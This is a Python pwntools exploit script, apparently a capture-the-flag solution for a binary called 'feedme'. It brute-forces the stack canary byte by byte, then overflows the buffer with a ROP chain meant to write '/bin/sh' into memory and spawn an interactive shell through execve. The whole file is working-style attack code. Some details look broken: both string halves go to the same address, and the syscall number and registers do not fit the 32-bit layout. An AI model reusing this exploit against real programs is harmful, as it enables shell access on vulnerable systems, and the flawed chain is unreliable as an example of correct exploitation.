from pwn import *

target = process("./feedme")
def breakcanary():
    inpsize = 0x22 #0x20 for padding + 2 for 00 and next byte.
    
    canban = "00"
    canary_str = "\x00"
    can=0
    for i in range(3):
        for byte in range(0xff):
            target.send(p32(inpsize)[0])
            target.send("0" * 0x20 + canary_str + p32(byte)[0] )
            print(hex(((byte << ((i + 1) * 8)) | can)))            
            output = target.recvuntil("exit.")
            if "YUM" in output:
                can = (byte << ((i + 1) * 8)) | can
                canary_str += p32(byte)[0]
                inpsize += 1
                canban = hex(byte).replace("0x","") + canban
                print(canban)
                break

    return can 
canary = breakcanary()
print("=======\ncanary: ")
print(hex(canary))

popeax = 0x080bb496
syscall = 0x0806328d
popedi = 0x0804846f
popesi = 0x08049dd5
popedx = 0x0806f34a
writeto = 0x80ea420
mov = 0x0807be31 #mov dword ptr [eax], edx ; ret
half1 = 0x6e69622f  #/bin
half2 = 0x0068732f #/sh (writeto + 4)

def write(loc, data):
    pay = p32(popedx)
    pay += p32(data)
    pay += p32(popeax)
    pay += p32(loc)
    pay += p32(mov)
    return pay



payload = write(writeto, half1)
payload += write(writeto, half2)
payload += p32(popeax)
payload += p32(59)
payload += p32(popedi)
payload += p32(writeto)
payload += p32(popesi)
payload += p32(0) + p32(popedx) + p32(0) + p32(syscall)

target.sendline("a" * 0x20 + p32(canary) + "a" + payload)

target.interactive()
